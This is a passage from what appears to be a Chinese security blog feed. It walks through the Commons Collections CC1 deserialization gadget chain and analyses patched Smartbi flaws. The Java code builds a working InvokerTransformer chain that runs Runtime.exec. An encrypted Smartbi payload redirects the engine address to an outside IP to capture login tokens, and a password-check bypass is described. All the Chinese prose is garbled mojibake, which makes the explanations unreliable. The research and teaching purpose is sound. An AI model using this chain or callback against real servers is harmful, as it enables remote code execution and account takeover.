å…¥çš„ä¸¤ä¸ªå‚æ•°ï¼Œå…ˆè¯´ç¬¬äºŒä¸ªå§ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯æˆ‘ä»¬ä¸Šé¢å·²ç»æ„é€ å¥½çš„transformedmapã€‚ç¬¬ä¸€ä¸ªå‚æ•°å‘¢ï¼Œæ˜¯æˆ‘ä»¬ä¸Šé¢æåˆ°çš„æ³¨è§£ï¼Œè¿™é‡Œè´´å¼ å›¾å§ï¼Œè¿™é‡Œä¸»è¦æ‰¾å¸¦æœ‰å‚æ•°çš„æ³¨è§£ï¼Œæ–¹ä¾¿æˆ‘ä»¬è§£å†³ç¬¬äºŒä¸ªé—®é¢˜</p><p><img src="https://ice.frostsky.com/2023/08/30/3cd34b32dcc09e590808596299903a95.png" alt="3cd34b32dcc09e590808596299903a95"></p><p><strong>è§£å†³ç¬¬äºŒä¸ªé—®é¢˜</strong></p><p>ä¸¤ä¸ªifè¯­å¥é€šè¿‡æ¥æ”¶æˆ‘ä»¬ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°å’Œæˆ‘ä»¬Mapä¸­çš„keyæ¥è¿›è¡Œåˆ¤æ–­ï¼Œå…·ä½“é€»è¾‘æ˜¯ï¼š</p><p>ç¬¬ä¸€ä¸ªifåˆ¤æ–­ä¼ å…¥keyæ˜¯å¦ä¸ºç©ºã€‚</p><p>ç¬¬äºŒä¸ªifåˆ¤æ–­ä¸¤ä¸ªå‚æ•°æ˜¯å¦å¯ä»¥å¼ºè½¬ã€‚</p><p>   <code>Object o = annotationInvocationdhdlConstructor.newInstance(Target.class,transformedmap);</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//memberé—®é¢˜</span><br><br>       HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>       map.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>       Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br><br>       <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>       <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationInvocationdhdlConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);<br>       annotationInvocationdhdlConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>       <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotationInvocationdhdlConstructor.newInstance(Target.class,transformedmap);<br></code></pre></td></tr></table></figure><p>å› ä¸ºæˆ‘ç”¨çš„æ˜¯@Target,æˆ‘çš„mapä¸­keyçš„å€¼ä¸ºvalueï¼Œä»–å’Œ@targetä¸­çš„å‚æ•°æ˜¯ç›¸åŒçš„éƒ½æ˜¯valueã€‚æ‰€ä»¥ä¸¤ä¸ªifä¹Ÿè§£å†³äº†</p><p><strong>è§£å†³ç¬¬ä¸‰ä¸ªé—®é¢˜</strong></p><p>å…¶å®ç¬¬ä¸‰ä¸ªé—®é¢˜æˆ‘ä»¬å·²ç»åœ¨åˆšå¼€å§‹éƒ½å·²ç»è§£å†³äº†ï¼Œè¿™é‡Œå†æä¸€ä¸‹çš„åŸå› æ˜¯å› ä¸ºåœ¨ä»–çš„æ–¹æ³•ä¸­æœ‰ä¸€ä¸ªå¯ä»¥éå†invokerTransformerï¼Œè¿™æ ·æˆ‘ä»¬å°±ä¸ç”¨åƒå¥—å¨ƒä¸€æ ·çš„å¥—äº†ã€‚</p><p><img src="https://ice.frostsky.com/2023/08/30/a9b36b4c876705e0decbe600d94d7d12.png" alt="image-20230830202922544"></p><p>ä»–æ¥æ”¶ä¸€ä¸ªtransformersçš„ä¸€ä¸ªæ•°ç»„ï¼Œç„¶åé€’å½’è°ƒç”¨æ•´ä¸ªæ•°ç»„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿™æ ·å†™ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//åˆ›å»ºtransformersæ•°ç»„</span><br>Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><span class="hljs-comment">//ä¼ å…¥transformersæ•°ç»„</span><br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><span class="hljs-comment">//è°ƒç”¨chainedTransformer.transform(),å…¶å®æ€»å…±è¿™é‡Œæˆ‘ä»¬æ§åˆ¶çš„å˜é‡åªæœ‰è¿™ä¸ªchainedTransformer.transform()ä¸­çš„å‚æ•°å€¼ã€‚</span><br>chainedTransformer.transform(Runtime.class);<br></code></pre></td></tr></table></figure><p><strong>è§£å†³ç¬¬å››ä¸ªé—®é¢˜</strong></p><p><img src="https://ice.frostsky.com/2023/08/30/351a353442919b731c7c5b8cb509eba4.png" alt="image-20230830204207809"></p><p>æˆ‘ä»¬å…ˆè·Ÿè¿›ä¸€ä¸‹setValueçœ‹çœ‹ä»–å†…éƒ¨åˆ°åº•æ˜¯æ€ä¹ˆæ ·å®ç°çš„ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/30/d85b966c1a0bed2aebc59c1e3993b130.png" alt="image-20230830204258906"></p><p>çœ‹åˆ°è¿™é‡Œæœ‰æ²¡æœ‰ä¸€ç§ç†Ÿæ‚‰çš„èµ¶è„šï¼Œå†æ¬¡è·Ÿè¿›ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/30/ddbf790fb4a092a4d43ed4ac8ca6903b.png" alt="ddbf790fb4a092a4d43ed4ac8ca6903b"></p><p>æˆ‘ä»¬å‘ç°ä»–æœ€åè¿™é‡Œè°ƒç”¨äº†æˆ‘ä»¬ä¼ å…¥çš„<code>chainedTransformer</code>ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ç¬¬ä¸‰ä¸ªé—®é¢˜å½“ä¸­çš„<code>chainedTransformer</code>ï¼Œæˆ‘æ¢ä¸€ç§å†™æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">å…¶å®è¿™é‡Œçš„    valueTransformer.transform(value);  <br>å°±æ˜¯æˆ‘ä»¬     chainedTransformer.transform(Runtime.class);<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦ä¿è¯ç»™ <code>chainedTransformer.transform()</code>ä¼ å…¥çš„å‚æ•°æ˜¯Runtime.classå³å¯ã€‚</p><p>ä½†æ˜¯è¿™é‡Œæ˜¯</p><p>æˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªéå¸¸æœ‰ç‰¹ç‚¹çš„å‡½æ•°å°±æ˜¯ConstantTransformer.<code>transform</code>ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/30/f567f26b5f7e704fb721b360b0c357f0.png" alt="d8e19b4e588f123c2e53107eb78ac1c6"></p><p>ä»–çš„ä½œç”¨å°±æ˜¯å°†<code>input</code>å¯¹è±¡è½¬æ¢ä¸ºä¸€ä¸ªå€¼ï¼Œå¹¶è¿”å›è¿™ä¸ªå€¼ã€‚</p><p>è™½ç„¶æœ€åçš„é‚£ä¸ªç‚¹æˆ‘ä»¬æ§åˆ¶ä¸äº†ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬é€šè¿‡<code>chainedTransformer.transform();</code>å»è°ƒç”¨ä»–çš„<code>transform</code>é‚£ä¹ˆæˆ‘ä»¬ä¹Ÿå¯ä»¥å°†æ•´æ¡é“¾ä¸²èµ·æ¥ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//è§£é‡Šï¼š</span><br><span class="hljs-comment">//è¿™é‡Œå¯èƒ½æœ‰äº›äººä¼šä¹±ï¼Œæˆ‘çŸ¥é“ä½ å¾ˆä¹±ï¼Œä½†æ˜¯ä½ å…ˆåˆ«ä¹±ï¼Œçœ‹å®Œè¿™æ®µè§£é‡Šå¯èƒ½ä¼šå¸®åŠ©ä½ ç†è§£</span><br><br><span class="hljs-comment">//é¦–å…ˆæˆ‘ä»¬è·Ÿè¿›åˆ°readObjectå½“ä¸­çš„setValueå½“ä¸­ã€‚</span><br><span class="hljs-comment">//æˆ‘ä»¬å‘ç°å®é™…æœ€åå®ç°çš„ä»£ç æ˜¯ï¼š</span><br>valueTransformer.transform(value); <br><br><span class="hljs-comment">//ä½†æ˜¯è¿™ä¸ªvalueTransformer.transform(value); ä¸­çš„valueTransformeræ˜¯æˆ‘ä»¬çš„chainedTransformerï¼Œæ‰€ä»¥ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªchainedTransformerå»è°ƒç”¨ConstantTransformerçš„transformï¼Œä»è€Œè®©ConstantTransformerçš„transformå»è·å–Runtime.classï¼Œä¸å°±è¡Œäº†å—ï¼Ÿä¹‹åå°±æ˜¯ä¸€ç³»åˆ—çš„ä¸²ï¼Œçœ‹ä»£ç ï¼š</span><br><br>Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;;<br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br><span class="hljs-comment">//çœ‹åˆ°è¿™ä½ ä¼šå‘ç°åŸæ¥CC1æ˜¯å¦‚æ­¤çš„ç®€å•</span><br></code></pre></td></tr></table></figure><h3 id="è°ƒç”¨é“¾ï¼š"><a href="#è°ƒç”¨é“¾ï¼š" class="headerlink" title="è°ƒç”¨é“¾ï¼š"></a>è°ƒç”¨é“¾ï¼š</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>   *<span class="hljs-constructor">Map(Proxy)</span>.entry<span class="hljs-constructor">Set()</span><br>        *<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span>/<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TransformedMap</span>.</span></span>set<span class="hljs-constructor">Value()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œæˆ‘ä»¬å·²ç»å®Œæ•´çš„ç†è§£äº†ä»TransformerMapå…¥å£çš„CC1é“¾ï¼Œåé¢æˆ‘ä»¬å†è®²å¦å¤–ä¸€æ¡CC1å§ï¼Œè¿™ç¯‡æ–‡ç« å·²ç»å†™äº†ä¸¤å¤©äº†ï¼Œè¯´å®è¯çœŸçš„æŒºè´¹ç¥çš„ã€‚</p><p>å¤§å®¶ä¸€å®šè¦è®¤çœŸåƒé€CC1ï¼Œåªè¦CC1æ²¡é—®é¢˜äº†ï¼Œå…¶ä»–å‡ æ¡CCéƒ½æ˜¯æ’åˆ—ç»„åˆï¼Œå­¦èµ·æ¥éå¸¸è½»æ¾ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Smartbié‚£äº›äº‹</title>
    <link href="/2023/08/28/Smartbi%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"/>
    <url>/2023/08/28/Smartbi%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h1><p>Smartbiç¡®å®å¯¹äºæˆ‘åœ¨æ¼æ´åˆ†ææ–¹é¢æä¾›äº†å¾ˆå¤šæ€è·¯å’Œæå‡ã€‚è¦åˆ†æ1dayå°±å¾—æ ¹æ®å®˜æ–¹å‘å¸ƒçš„è¡¥ä¸æ¥â€œå¯¹ç—‡ä¸‹è¯â€ï¼Œä½†æ˜¯è¿™ä¸ªSmartbiçš„è¡¥ä¸æ˜¯ç»è¿‡åŠ å¯†çš„ï¼Œè§£åŒ…å¯¹äºæˆ‘ä¸€ä¸ªèœé¸¡æ¥è¯´ï¼Œè¿˜æ˜¯æœ‰ç‚¹é¡¶ã€‚åæ¥åœ¨å¸ˆçˆ¶æä¾›çš„æ€è·¯ä¸‹ï¼Œæˆ‘é€šè¿‡å­¦ä¹ è¿˜æ˜¯æäº†å‡ºæ¥ï¼Œé¦–å…ˆåœ¨Smartbiçš„å‘½ä»¤å¯åŠ¨æ¡†ä¼šæ˜¾ç¤ºä¸€äº›å †æ ˆä¿¡æ¯ï¼Œåœ¨æ‰“äº†è¡¥ä¸ä¹‹åï¼Œlibç›®å½•ä¸‹çš„æºç ç»è¿‡æˆ‘diffä¹‹åå‘ç°æ²¡æœ‰ä¸€ç‚¹å˜åŒ–ï¼Œæˆ‘ç”¨å·¥å…·æŠŠSmartbiå…¨å±€æ–‡ä»¶è¿›è¡Œæ¯”è¾ƒï¼Œå‘ç°åªå¤šäº†ä¸€ä¸ª3kçš„extæ–‡ä»¶ã€‚æ‰“å¼€ä¹‹åæ–‡ä»¶å†…å®¹å’Œæˆ‘çš„å¤§è„‘æ˜¯ä¸€æ ·çš„å‡Œä¹±çš„ã€‚å¸ˆçˆ¶ç»™äº†ä¸€ç§æ€è·¯æƒ³ï¼Œå°±æ˜¯åœ¨æ‰“äº†è¡¥ä¸ä¹‹åçš„ç¨‹åºä¸­ï¼Œå»ä»å†…å­˜ä¸­ç›´æ¥æ“ä½œä»–çš„å­—èŠ‚ç ï¼Œå°†è¡¥ä¸è¯¦ç»†ä¿¡æ¯æŒ–å‡ºæ¥ã€‚åæ¥æˆ‘å°±å­¦äº†ç±»åŠ è½½ã€å­¦äº†javassistã€‚ç»ˆäºåœ¨æˆ‘çš„ä¸æ‡ˆåŠªåŠ›ä¸‹ï¼Œå°†åŠ å¯†çš„extç»™æŒ–äº†å‡ºæ¥ã€‚è‡³äºåˆ†æï¼Œå¾ˆç®€å•ï¼Œéš¾çš„æ˜¯è¡¥ä¸è§£åŒ…ã€‚åˆ†æçš„è¯å°±è·Ÿç€è¡¥ä¸èµ°ï¼Œæ‰¾å‡½æ•°ï¼Œçœ‹å‚æ•°ï¼Œè·Ÿå°±å®Œäº†ã€‚ç»è¿‡Smartbiè¿™ä¸€ç³»åˆ—æ´çš„åˆ†æï¼Œç¡®å®æ”¶è·äº†ä¸å°‘çš„ä¸œè¥¿ï¼Œå¸Œæœ›åé¢è‡ªå·±å¯ä»¥å¤šæ¥è§¦è¿™ç§éš¾é¢˜ã€‚</p><p>Smartbiçš„æ´æˆ‘éƒ½å·²ç»é€šè¿‡å®˜æ–¹è¡¥ä¸å¤ç°å’Œåˆ†æè¿‡äº†ï¼Œåªæ˜¯æœ‰äº›èƒ½å‘æœ‰äº›å‘ä¸äº†ï¼Œåç»­è¦æ˜¯èƒ½å‘æˆ‘ä¼šç¬¬ä¸€æ—¶é—´åˆ†äº«å‡ºæ¥ã€‚ä¸‹é¢å°±å…ˆçœ‹ä¸¤ä¸ªæ´ï¼Œåªæ˜¯åˆ†ææ–‡ç« ï¼Œå¹¶æ²¡æœ‰ä»»ä½•æµ‹è¯•å’Œæ”»å‡»çš„payloadï¼Œæ„Ÿå…´è¶£çš„ç«¥é‹å¯ä»¥è‡ªå·±è·Ÿä¸€ä¸‹ã€‚</p><h1 id="SmartbiTokenå›è°ƒ"><a href="#SmartbiTokenå›è°ƒ" class="headerlink" title="SmartbiTokenå›è°ƒ"></a>SmartbiTokenå›è°ƒ</h1><p>æ ¹æ®å®˜æ–¹è¡¥ä¸ï¼Œå‘ç°å¯¹setAddressæ·»åŠ äº†è§„åˆ™æ‰€ä»¥æˆ‘ä»¬ä¸»è¦æ‰¾setAddressã€‚</p><p><img src="https://ice.frostsky.com/2023/08/28/f2ee4f1cdee444c0b054746f2f5baca9.png" alt="image-20230828111158893"></p><p>é€šè¿‡æŸ¥æ‰¾æˆ‘ä»¬æ‰¾åˆ°äº†MonitorService.<code>setAddress</code>ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/28/0e5699856d4f645929cb4a4fd5f8726a.md.png" alt="image-20230828111708299"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œå…ˆæ˜¯åˆ›å»ºå¯¹è±¡ï¼Œç„¶åå¯¹å¯¹è±¡è§£å¯†ï¼Œä¹‹åç”¨è·å–å¯¹è±¡ä¸­çš„jsonæ•°æ®ï¼Œå…¶ä¸­keyæœ‰ï¼štypeã€c_addressã€u_addressä¹‹åä¼šå¯¹typeåšåˆ¤æ–­æ˜¯å“ªä¸ªç±»å‹å°±æ‰§è¡Œå“ªä¸ªæ“ä½œã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬è¦ä¼ å…¥è¿™ä¸ªaddressçš„è¯ï¼Œå¹¶ä¸èƒ½ä¹‹é—´ä»¥æ˜æ–‡å½¢å¼ä¼ å…¥ï¼Œæˆ‘ä»¬åœ¨å‡½æ•°å†…éƒ¨ç”¨<code>desEncode()</code>æ–¹æ³•ä¼ å…¥<code>keyï¼šisPassword</code>å†å¯¹æˆ‘ä»¬ä¼ å…¥çš„æ•°æ®ï¼š<code>&#123;&quot;type&quot;:&quot;experiment&quot;,&quot;c_address&quot;:&quot;http://10.65.182.92:9999&quot;,&quot;u_address&quot;:&quot;http://10.65.182.92:9999&quot;&#125;</code>è¿›è¡ŒåŠ å¯†å¾—åˆ°ç»“æœä¸ºï¼š<code>312E8684378EBDFF7E798B0BCCC45588EF682890F6F1701AF9D9416B4E357E80A1E8622D15B57E600944EC786F4E598DDE87CF4513277AC2EF3B38E69123E4B6C6BBDCDD5B6667AF74E81B278122E7F70E78A64F63A3D29BE2ADA07B0ADB17D88C825CA874F302FF</code></p><p>å¯ä»¥çœ‹åˆ°ifåˆ†æ”¯ä¸­æœ‰ä¸¤ä¸ªæ–¹æ³•ï¼š<code>setEngineAddress()</code>ã€<code>setServiceAddress</code>ã€‚ä¸”è¿™é‡Œåªèƒ½è°ƒç”¨<code>setEngineAddress()</code>æ–¹æ³•ï¼Œå› ä¸ºå†æ­£å¼è°ƒç”¨æ–¹æ³•ä¹‹å‰ä¼šæå‰è¿›è¡Œåˆ¤æ–­ï¼Œè°ƒç”¨<code>setEngineAddress()</code>çš„ä¸¤ä¸ªå‚æ•°serviceAddresså’ŒcAddresséƒ½æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œä½†æ˜¯<code>setServiceAddress</code>æˆ‘ä»¬æ˜¯æ§åˆ¶ä¸äº†çš„å› ä¸ºä»–ä¼šåªæœ‰ä¸€ä¸ªå‚æ•°æˆ‘ä»¬èƒ½æ§åˆ¶ï¼šcAddresså¦å¤–ä¸€ä¸ªå‚æ•°serviceAddressæ˜¯ä¼šä»æœåŠ¡å™¨ç«¯è·å–çš„ã€‚</p><p>çœ‹åˆ°è¿™é‡Œæˆ‘ä»¬å†è·Ÿè¿›ä¸€ä¸‹<code>setEngineAddress()</code>ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/28/5267839a0cf5400885776b951d7c4dfe.png" alt="image-20230828113035113"></p><p>è·Ÿè¿›updateSystemComfigï¼š</p><p><img src="https://ice.frostsky.com/2023/08/28/f46f85d72b18bc7d9ca1d28802a75ced.png" alt="image-20230828134435604"></p><p>å¯ä»¥çœ‹åˆ°updateSystemConfigå°†æˆ‘ä»¬ä¼ å…¥çš„engineAddressè¿›è¡Œäº†æ›´æ–°ã€‚</p><p>å¾€ä¸‹çœ‹å‘ç°äº†MonitorService.<code>getToken()</code>ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/28/61dabf4e5fd941ef22736e66dd6d2bea.png" alt="image-20230828135126274"></p><p>ä»–é€šè¿‡æ¥æ”¶typeç„¶åå¯¹typeè¿›è¡Œåˆ¤æ–­ï¼Œä»è€Œå°†resultä»¥jsonæ ¼å¼å‘é€åˆ°æŒ‡å®šçš„å¼•æ“URLã€‚</p><p>åˆ°è¿™é‡Œæˆ‘ä»¬ä¹Ÿå°±æ¸…æ¥šäº†æ¼æ´çš„æˆå› ï¼Œåˆ°è¿™å¹¶ä¸æ˜¯æœ€å±é™©çš„ï¼Œæœ€å±é™©çš„æ˜¯ä»–ç«Ÿç„¶æœ‰ä¸€ä¸ªç”¨Tokenç™»å½•çš„æ–¹æ³•ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/28/292acecae4b845ab4a3057aa60691c4c.png" alt="image-20230828141439080"></p><p><img src="https://ice.frostsky.com/2023/08/28/f29be21157e28b7b642642f2cbd91fc8.png" alt="image-20230828135900929"></p><p>è‡³æ­¤æˆ‘ä»¬å°±æŠŠæ•´ä¸ªæ¼æ´çš„åˆ©ç”¨è¿‡ç¨‹ä¹Ÿå·²ç»åˆ†æå®Œã€‚</p><p>å…¶å®è¿˜æœ‰ä¸€ç§åˆ©ç”¨æ–¹æ³•å°±æ˜¯ç›´æ¥è°ƒç”¨<code>setEngineAddress</code>è®¾ç½®å¼•æ“åœ°å€ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/28/2e5fa7dffaf6f4fc7680aae5bdd9adda.png" alt="image-20230828141802060"></p><p>è¿™ç§æ–¹æ³•æ¯”ä¸Šé¢ä»‹ç»çš„é‚£ç§æ–¹æ³•æ›´ç®€å•ä¸€äº›ï¼Œå› ä¸ºå°‘äº†åŠ å¯†çš„æ­¥éª¤ï¼Œå¯ä»¥ç›´æ¥å°†åœ°å€ä¼ å…¥,ä¹‹åå°±æ˜¯å’Œä¹‹å‰ç›¸åŒçš„æµç¨‹äº†ã€‚</p><h1 id="Smartbiç ´è§£å¯†ç "><a href="#Smartbiç ´è§£å¯†ç " class="headerlink" title="Smartbiç ´è§£å¯†ç "></a>Smartbiç ´è§£å¯†ç </h1><p>å®˜æ–¹è¡¥ä¸ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/28/553d7176565f9cfe058998bbdc9dac82.png" alt="image-20230828143933047"></p><p>å¼€å§‹éƒ¨åˆ†æ˜¯åˆ¤æ–­è¯·æ±‚è·¯å¾„æ˜¯å¦ä»¥<code>&quot;/vision/RMIServlet&quot;</code>å¼€å§‹ä¹‹åè¿›å…¥åç»­æ¥æ”¶å‚æ•°çš„æµç¨‹ã€‚</p><p><img src="https://ice.frostsky.com/2023/08/28/069b41829dd9ea862cba0cc0b2931baf.png" alt="image-20230801160931962"></p><p>è¿™é‡Œå…ˆç”¨<code>windowUnloading</code>æ–¹å¼ï¼Œä¼ å…¥æˆ‘ä»¬ä¹‹å‰åœ¨å†…ç½®ç”¨æˆ·ç»•è¿‡æ¼æ´ä¸­è‡ªå®šä¹‰çš„<code>RMICoder.encode</code>å› ä¸ºä»£ç åº•å±‚çš„encodeå’Œdecodeæ˜¯ä¸å¯¹ç§°çš„ã€‚</p><p>ä¹‹åæˆ‘ä»¬ä¼šæ¥åˆ°ç†Ÿæ‚‰çš„<code>needToCheck()</code>æ–¹æ³•ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/28/c69c48c41002fd0ecfd240a132c6914f.png" alt="image-20230801161802797"></p><p><img src="https://ice.frostsky.com/2023/08/28/7edb4f5c06157005d92256c2699039c7.png" alt="image-20230801161412482"></p><p>è¿™ä¸€æ­¥æˆ‘ä»¬åœ¨ä¹‹å‰è®²è¿‡ï¼Œè¿™æ®µä»£ç çš„ä½œç”¨æ˜¯å¯¹è¯·æ±‚è¿›è¡Œè¿‡æ»¤å’ŒéªŒè¯ï¼Œä»¥ç¡®ä¿ç¬¦åˆæŒ‡å®šæ¡ä»¶åæ‰æ‰§è¡Œåç»­çš„æ“ä½œã€‚</p><p>å› ä¸ºæˆ‘ä»¬å‘é€çš„æ˜¯POSTè¯·æ±‚ï¼Œç´§æ¥ç€ä¼šè¿›å…¥<code>doPost()</code>ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/28/476c2fa26a5be58712b0e154d55359af.md.png" alt="image-20230801165716411"></p><p>åœ¨doPostä¸­ä¼šå¯¹POSTè¯·æ±‚ä¸­ä¼ å…¥çš„å‚æ•°è¿›è¡Œå†æ¬¡æ¥æ”¶ã€‚</p><p>å…¶å®çœ‹åˆ°è¿™é‡Œæˆ‘ä»¬ä¹Ÿå°±æ¸…æ¥šäº†ä¸ºä»€ä¹ˆæ—¢è¦ç”¨<code>windowUnloading</code>ä¼ å‚ï¼Œè¿˜è¦ç”¨POSTä¼ å‚ã€‚</p><p>æˆ‘ä»¬çš„ç›®çš„æ˜¯åˆ©ç”¨<code>windowUnloading</code>ä¼ å…¥çš„å‚æ•°å»ç»•è¿‡<code>needToCheck()</code>ä¸­çš„æ£€æµ‹ï¼Œä¹‹åç­‰ç¨‹åºé¡ºåˆ©èµ°åˆ°<code>doPost</code>ä¸­æˆ‘ä»¬å¯ä»¥é‡æ–°ä¼ 